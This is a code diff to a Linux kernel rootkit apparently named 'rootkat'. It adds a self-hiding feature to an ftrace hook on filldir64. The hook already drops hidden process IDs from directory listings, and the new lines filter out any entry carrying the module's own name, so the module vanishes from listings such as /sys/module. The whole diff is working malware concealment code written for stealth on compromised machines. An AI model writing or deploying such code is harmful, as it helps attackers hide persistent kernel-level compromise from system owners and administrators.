@@ -2,11 +2,20 @@
 #include <linux/dcache.h>
 #include <linux/fs.h>
 #include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/string.h>
 #include "ftrace_hook.h"
 #include "hook_filldir64.h"
 #include "hidden_pids.h"
 
 #define TAG "rootkat/hook_filldir64: "
+
+/* Self-hide: filter any directory entry literally named "rootkat".
+ * Hides /sys/module/rootkat from `ls /sys/module/` and anything else
+ * with that exact name. Direct path access by name still works, since
+ * we filter only the readdir/getdents path, not stat. */
+static const char ROOTKAT_NAME[] = KBUILD_MODNAME;
+#define ROOTKAT_NAME_LEN (sizeof(ROOTKAT_NAME) - 1)
 
 static const char * const filldir64_candidates[] = {
 	"filldir64", NULL,
@@ -33,6 +42,10 @@ static bool rootkat_filldir64(struct dir_context *ctx, const char *name,
 
 	if (rootkat_is_pid_name_hidden(name, namlen))
 		return true;   /* skip silently — caller advances iterator */
+
+	if (namlen == ROOTKAT_NAME_LEN &&
+	    memcmp(name, ROOTKAT_NAME, ROOTKAT_NAME_LEN) == 0)
+		return true;   /* hide our own module directory entries */
 
 	return orig(ctx, name, namlen, offset, ino, d_type);
 }
